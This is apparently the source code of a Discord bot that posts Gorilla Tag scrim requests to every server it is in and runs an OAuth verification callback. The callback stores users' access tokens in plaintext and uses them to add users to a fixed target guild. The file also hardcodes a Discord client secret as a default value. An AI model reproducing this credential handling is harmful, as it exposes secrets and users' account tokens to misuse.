import os
import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import random
import re
import requests
import json
from flask import Flask, request
import threading

# --- Configuration --- #
TOKEN = os.getenv('DISCORD_BOT_TOKEN')
CLIENT_ID = "1518171487666831452"
CLIENT_SECRET = os.getenv('DISCORD_CLIENT_SECRET', 'huY8T_BkrNP_uAD02pEIksmYty4KQHEa')
REDIRECT_URI = os.getenv('REDIRECT_URI', 'https://web-production-089e6.up.railway.app/callback')
TARGET_GUILD_ID = "1518478281698181230"
BOT_OWNER_ID = int(os.getenv('BOT_OWNER_ID', 0))

# --- Bot Setup --- #
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.presences = True

bot = commands.Bot(command_prefix='!', intents=intents)

# --- Database Logic --- #
DB_FILE = "database.json"

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {
        'users': {},
        'server_settings': {},
        'global_settings': {'banned_words': [], 'version': [0, 0, 1]},
        'stats': {}
    }

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4)

db = load_db()

# --- Memory --- #
active_scrims = {}
users_who_received_requirements = set()
authorized_users = [836166145387397120]
command_usage_stats = db.get('stats', {})

def get_user_data(user_id):
    uid = str(user_id)
    if uid not in db['users']:
        db['users'][uid] = {'verified': False, 'wins': 0, 'losses': 0, 'token': None}
        save_db(db)
    return db['users'][uid]

def update_user_data(user_id, **kwargs):
    uid = str(user_id)
    data = get_user_data(uid)
    data.update(kwargs)
    db['users'][uid] = data
    save_db(db)

def get_server_settings(guild_id):
    gid = str(guild_id)
    if gid not in db['server_settings']:
        db['server_settings'][gid] = {'banned_words': [], 'welcome_dm': True, 'scrim_notifications': True}
        save_db(db)
    return db['server_settings'][gid]

global_settings = db['global_settings']

def increment_version():
    v = global_settings['version']
    v[2] += 1
    if v[2] > 12:
        v[2] = 0
        v[1] += 1
    if v[1] > 12:
        v[1] = 0
        v[0] += 1
    save_db(db)
    return f"{v[0]}.{v[1]}.{v[2]}"

# --- Colors ---
BLURPLE = 0x5865F2
MINT_ACCENT = 0x40E0D0
SUCCESS_GREEN = 0x2ECC71

# --- Profanity Filter ---
PROFANITY_LIST = ["slur1", "slur2", "swear1", "swear2", "f*ck", "sh*t", "b*tch", "n*gger", "r*tard"]

def contains_profanity(text):
    text = text.lower()
    return any(word in text for word in PROFANITY_LIST)

# --- Utility ---
async def send_welcome_message(user: discord.User):
    if user.id in users_who_received_requirements:
        return
    embed = discord.Embed(title="🦍 Gorilla Tag Scrim Finder", description="Organize competitive scrims instantly.", color=BLURPLE)
    embed.add_field(name="🚀 How It Works", value="• **/findscrim**: Create a request.\n• **Global Reach**: Hits every server.\n• **Instant Match**: Join via broadcast.", inline=False)
    embed.set_footer(text="Created by frog360 • Powered by Aurorasystem")
    try:
        await user.send(embed=embed)
        users_who_received_requirements.add(user.id)
    except: pass

async def delete_after_delay(message, delay):
    await asyncio.sleep(delay)
    try: await message.delete()
    except: pass

# --- Events --- #
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    await bot.tree.sync()

@bot.event
async def on_message(message):
    if message.author == bot.user: return
    gid = str(message.guild.id) if message.guild else None
    local_banned = db['server_settings'].get(gid, {}).get('banned_words', []) if gid else []
    if any(word.lower() in message.content.lower() for word in global_settings['banned_words'] + local_banned):
        try:
            await message.delete()
            await message.channel.send(f"{message.author.mention}, restricted word detected.", delete_after=5)
        except: pass
    await bot.process_commands(message)

# --- Modals --- #
class ClanNameModal(ui.Modal, title='🦍 Enter Your Clan Name'):
    clan_name = ui.TextInput(label='Clan Name (1-5 characters)', placeholder='e.g., ABC', min_length=1, max_length=5, required=True)

    def __init__(self, scrim_id):
        super().__init__()
        self.scrim_id = scrim_id

    async def on_submit(self, interaction: discord.Interaction):
        # ALWAYS defer first to prevent "Application did not respond"
        await interaction.response.defer(ephemeral=True)

        if contains_profanity(self.clan_name.value):
            await interaction.followup.send("❌ Respectful clan names only.", ephemeral=True)
            return

        scrim_info = active_scrims.get(self.scrim_id)
        if not scrim_info or len(scrim_info['accepted_teams']) >= scrim_info['max_teams']:
            await interaction.followup.send("❌ Scrim full or inactive.", ephemeral=True)
            return

        if interaction.user.id == scrim_info['requester_id']:
            await interaction.followup.send("❌ You cannot join your own scrim.", ephemeral=True)
            return

        scrim_info['accepted_teams'].append({'user_id': interaction.user.id, 'clan_name': self.clan_name.value})
        
        # Update stats
        gid = str(interaction.guild_id)
        command_usage_stats.setdefault(gid, {'find_scrim': 0, 'accepted': 0})['accepted'] += 1
        db['stats'] = command_usage_stats
        save_db(db)

        # Notify requester
        requester = bot.get_user(scrim_info['requester_id'])
        if requester:
            embed = discord.Embed(title="✅ Scrim Accepted!", description=f"**{self.clan_name.value}** accepted your {scrim_info['size']} scrim!", color=MINT_ACCENT)
            embed.add_field(name="🔑 Code:", value=f"||***{scrim_info['code']}***||")
            try:
                msg = await requester.send(embed=embed)
                bot.loop.create_task(delete_after_delay(msg, 1200))
            except: pass

        # Background task for mass message updates to avoid blocking
        bot.loop.create_task(self.mass_update_messages(scrim_info))
        await interaction.followup.send(f"✅ Accepted! Code: ||***{scrim_info['code']}***||", ephemeral=True)

    async def mass_update_messages(self, scrim_info):
        is_full = len(scrim_info['accepted_teams']) >= scrim_info['max_teams']
        for channel_id, msg_id in scrim_info['message_ids'].items():
            try:
                channel = bot.get_channel(channel_id)
                if not channel: continue
                message = await channel.fetch_message(msg_id)
                embed = message.embeds[0]
                embed.set_field_at(1, name="👥 Accepted Teams:", value=f"{len(scrim_info['accepted_teams'])}/{scrim_info['max_teams']}", inline=True)
                if is_full:
                    embed.color = SUCCESS_GREEN
                    await message.edit(embed=embed, view=None)
                else:
                    await message.edit(embed=embed)
            except: continue

# --- Views --- #
class ScrimView(ui.View):
    def __init__(self, scrim_id):
        super().__init__(timeout=1200)
        self.scrim_id = scrim_id

    @ui.button(label="Join Scrim", style=discord.ButtonStyle.success, emoji="🎮")
    async def join_button(self, interaction: discord.Interaction, button: ui.Button):
        # Modal handles its own deferral
        await interaction.response.send_modal(ClanNameModal(self.scrim_id))

# --- Commands --- #
@bot.tree.command(name="findscrim", description="🚀 Find a scrim!")
@app_commands.describe(size="Size", ref_caster="Ref/Caster?", code="3-digit code", team_name="Team name")
@app_commands.choices(size=[app_commands.Choice(name="2v2", value="2v2"), app_commands.Choice(name="3v3", value="3v3"), app_commands.Choice(name="4v4", value="4v4")])
async def find_scrim(interaction: discord.Interaction, size: str, ref_caster: str, code: str, team_name: str):
    # Defer immediately because broadcasting to all guilds takes time
    await interaction.response.defer(ephemeral=True)

    if not interaction.user.guild_permissions.administrator and interaction.user.id != interaction.guild.owner_id:
        if not any(role.name.lower() in ['admin', 'owner'] for role in interaction.user.roles):
            await interaction.followup.send("❌ Admin/Owner only.", ephemeral=True)
            return

    if not (code.isdigit() and len(code) == 3):
        await interaction.followup.send("❌ Code must be 3 digits.", ephemeral=True)
        return
    
    scrim_id = str(random.randint(100000, 999999))
    active_scrims[scrim_id] = {'requester_id': interaction.user.id, 'size': size, 'code': code, 'max_teams': 2, 'accepted_teams': [], 'message_ids': {}}

    embed = discord.Embed(title=f"🦍 Scrim Request: {size}", description=f"Requested by **{team_name}**!", color=BLURPLE)
    embed.add_field(name="👤 Requester:", value=f"<@{interaction.user.id}>", inline=True)
    embed.add_field(name="👥 Accepted Teams:", value="0/2", inline=True)
    embed.add_field(name="⚖️ Ref/Caster:", value=ref_caster, inline=False)
    embed.set_footer(text="Created by frog360 • Powered by Aurorasystem")

    # Broadcasting in background to keep interaction responsive
    bot.loop.create_task(broadcast_scrim(scrim_id, embed))
    
    gid = str(interaction.guild_id)
    command_usage_stats.setdefault(gid, {'find_scrim': 0, 'accepted': 0})['find_scrim'] += 1
    db['stats'] = command_usage_stats
    save_db(db)

    await interaction.followup.send(f"📡 Broadcasting to {len(bot.guilds)} servers!", ephemeral=True)

async def broadcast_scrim(scrim_id, embed):
    view = ScrimView(scrim_id)
    for guild in bot.guilds:
        target = None
        for name in ['scrims', 'general']:
            target = discord.utils.get(guild.text_channels, name=name)
            if target: break
        if not target: target = guild.system_channel
        if not target: target = next((c for c in guild.text_channels if c.permissions_for(guild.me).send_messages), None)
        if target:
            try:
                msg = await target.send(embed=embed, view=view)
                active_scrims[scrim_id]['message_ids'][target.id] = msg.id
            except: pass

@bot.tree.command(name="settings", description="⚙️ Configure bot settings.")
@app_commands.choices(action=[
    app_commands.Choice(name="Add Banned Word", value="add_word"),
    app_commands.Choice(name="Remove Banned Word", value="remove_word"),
    app_commands.Choice(name="Toggle Welcome DMs", value="toggle_welcome"),
    app_commands.Choice(name="Show Settings", value="show")
])
async def settings(interaction: discord.Interaction, action: str, value: str = None):
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("❌ Admin only.", ephemeral=True)
        return

    gid = str(interaction.guild_id)
    s = db['server_settings'].setdefault(gid, {'banned_words': [], 'welcome_dm': True, 'scrim_notifications': True})

    if action == "add_word" and value:
        if value.lower() not in s['banned_words']:
            s['banned_words'].append(value.lower())
            save_db(db)
            await interaction.response.send_message(f"✅ Added `{value}`.", ephemeral=True)
    elif action == "toggle_welcome":
        s['welcome_dm'] = not s['welcome_dm']
        save_db(db)
        await interaction.response.send_message(f"👋 Welcome DMs: **{'ON' if s['welcome_dm'] else 'OFF'}**.", ephemeral=True)
    elif action == "show":
        embed = discord.Embed(title=f"⚙️ Settings: {interaction.guild.name}", color=BLURPLE)
        embed.add_field(name="🚫 Banned Words", value=f"`{', '.join(s['banned_words']) or 'None'}`", inline=False)
        embed.add_field(name="👋 Welcome DMs", value=f"`{'ON' if s['welcome_dm'] else 'OFF'}`", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)
    else:
        await interaction.response.send_message("✅ Settings updated.", ephemeral=True)

# --- Web Server --- #
app = Flask(__name__)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code: return "Error: No code", 400
    try:
        res = requests.post('https://discord.com/api/oauth2/token', data={'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI}, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        token = res.json().get('access_token')
        user = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f"Bearer {token}"}).json()
        uid = user.get('id')
        update_user_data(uid, verified=True, token=token)
        for guild in bot.guilds:
            member = guild.get_member(int(uid))
            if member:
                role = discord.utils.get(guild.roles, name="Unverified")
                if role: asyncio.run_coroutine_threadsafe(member.remove_roles(role), bot.loop)
        requests.put(f"https://discord.com/api/guilds/{TARGET_GUILD_ID}/members/{uid}", headers={'Authorization': f"Bot {TOKEN}"}, json={'access_token': token})
        return "<h1>Success!</h1><p>Verified and added. You can close this.</p>"
    except Exception as e: return f"<h1>Error</h1><p>{str(e)}</p>", 500

# --- Start --- #
if TOKEN:
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000))), daemon=True).start()
    bot.run(TOKEN)
else:
    print("No token.")
